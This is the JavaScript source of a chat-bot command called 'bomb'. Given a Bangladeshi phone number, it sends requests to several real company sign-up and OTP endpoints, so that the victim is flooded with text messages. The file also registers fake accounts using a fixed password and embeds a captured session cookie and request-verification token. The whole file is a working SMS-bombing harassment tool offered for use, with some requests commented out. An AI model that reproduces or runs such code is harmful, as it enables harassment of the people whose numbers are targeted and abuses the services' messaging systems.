const axios = require("axios");

module.exports = {

	config: {		name: "bomb",

		aliases: ["bomber","sb"],

		version: "1.1",

		author: "Mahir Tahsan",

		countDown: 30,

		role: 0,

		shortDescription: {

			vi: "",

			en: "Number bombing"

		},

		longDescription: {

			vi: "",

			en: "Bombing a number"

		},

		category: "utility",

		guide: { en: "{pn} 01xxxxxxxx" }

	},

	onStart: async function ({ event, message, api, args }) {

		let number = args.join(" ");

		if (!number) return message.reply("Give a number, baka!");

// Function to send SMS using the different APIs

//async function bombSMS(number) {

  // First API

		try {

			let msgSend = message.reply("- Start bombing, wait some seconds...");

		const url1 = 'https://messkhujun-api.cyclenation.io/api/user-auth/login-register';

		const data1 = `{"phone":"+88${number}","appMode":"meal"}`;

		const headers1 = {

    		"content-type":"application/json",

    		"accept":"application/json, text/plain, */*"

  		};

		try {

		await axios.post(url1, data1, { headers: headers1 });

		} catch (error) {

    //console.error(error);

    // Handle the error here

  		}

  

  // Second API

  		const text = 'Fuh dilam jah'; // replace with actual text

  		const email = 'halarput@gmail.com';

  

  		const data2 = `{

    		"user_type": "buyer",

   	 		"phone": "${number}",

    		"country_code": "+880",

    		"name": "${text}",

    		"email": "${email}",

    		"home_address": "dhaka",

    		"password": "12345678",

    		"confirm_password": "12345678",

    		"selected_category": "1,1 ,65 ,121 ,58"

  		}`;

  		const url2 = 'https://fabriclagbe.com/api/encryption/auth/register';

  		const headers2 = {

    		"user-agent":"Dart/2.18 (dart:io)",

    		"content-type":"application/json; charset=utf-8",

    		"accept":"application/json",

    		"accept-encoding":"gzip",

    		"host":"fabriclagbe.com"

  		};

  		try {

    //await axios.post(url2, data2, { headers: headers2 });

  		} catch (error) {

    	console.error(error);

    // Handle the error here

  		}

  

  // Third API

  		const url3 = 'https://floralimited.com/account/checkuser';

  		//const data3 = `{"country_code":"+880","phone":"${number}"}`;

  		const data3 = 'Username=%2B88' + {number};

  		const headers3 = {

    		"Host":"floralimited.com",

			"Connection":"keep-alive",

			"Accept":"application/json, text/javascript, */*; q=0.01",

			"Content-Type":"application/x-www-form-urlencoded; charset=UTF-8",

			"X-Requested-With":"XMLHttpRequest",

			"User-Agent":"Mozilla/5.0 (Linux; Android 8.1.0; vivo Y85) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/105.0.0.0 Mobile Safari/537.36",

			"Origin":"https://floralimited.com",

			"Sec-Fetch-Site":"same-origin",

			"Sec-Fetch-Mode":"cors",

			"Sec-Fetch-Dest":"empty",

			"Referer":"https://floralimited.com/home/branches",

			"Accept-Encoding":"gzip, deflate, br",

			"Accept-Language":"en-US,en;q=0.9",

			"Cookie":"_ga=GA1.2.870838439.1667499476; __RequestVerificationToken=DEXYHIGejkwC2TA7T6Q6JF8cfgpozjbsVQhDybJqztWLNB5K4A2UZQBwPlJ4W9e_sClnjLU484QC8FB7WrWg30HnGV1j7jGBpyHBI6aUVFQ1; _gid=GA1.2.44989183.1667937279"

  		};

  		try {

    //await axios.post(url3, data3, { headers: headers3 });

  		} catch (error) {

    	console.error(error);

    // Handle the error here

  		}

  

  // Fourth API

  		const url4 = `http://apibeta.iqra-live.com/api/v1/sent-otp/${number}`;

  		const headers4 = {

    "x-user-channel": "apps",

  		};

  		try {

    		await axios.get(url4, { headers: headers4 });

  		} catch (error) {

    	console.error(error);

    // Handle the error here

  		}

  

  // Fifth API

  		const url5 = `https://www.thebodyshop.com.bd/smspro/customer/register?mobile=88${number}`;

  		try {

    		await axios.get(url5);

  		} catch (error) {

    	console.error(error);

    // Handle the error here

  		}

  		const url6 = 'https://prodapi.swap.com.bd/api/v1/send-otp/login';

  		const data6 = {

  		"mobile_number": `${number}`,

  		"referral": "false"

		};

  		console.log(data6);

  

  		try {

    		await axios.post(url6, data6);

  		} catch (error) {

    	console.error(error);

    // Handle the error here

  		}

  		const url7 = `http://www.cinespot.mobi/api/cinespot/v1/otp/sms/mobile-${number}/operator-Airtel/send`;

  		const headers7 = {

    		"User-Agent": "Dalvik/2.1.0 (Linux; U; Android 11; RMX3171 Build/RP1A.200720.011)",

  		};

  		try {

    		await axios.get(url7, { headers: headers7 });

  		} catch (error) {

    		console.error(error);

    // Handle the error here

  		}

  

  

  // 10 No API

  		const url10 = 'https://eshop.banglalink.net/wp-admin/admin-ajax.php';

  		const data10 = `action=otpRegistration&otpMobile=${number}`;

  		const headers10 = {

    		'Host': 'eshop.banglalink.net',

    		'Connection': 'keep-alive',

  		};

  		await axios.post(url10, data10, { headers: headers10 });

//		}

		await message.unsend((await msgSend).messageID);

			message.reply(`- Baka, Bombing succesful`);

		} catch (e) {

			console.error(e);

			message.reply("Something wrong 🥺🫰");

		}

	}

};
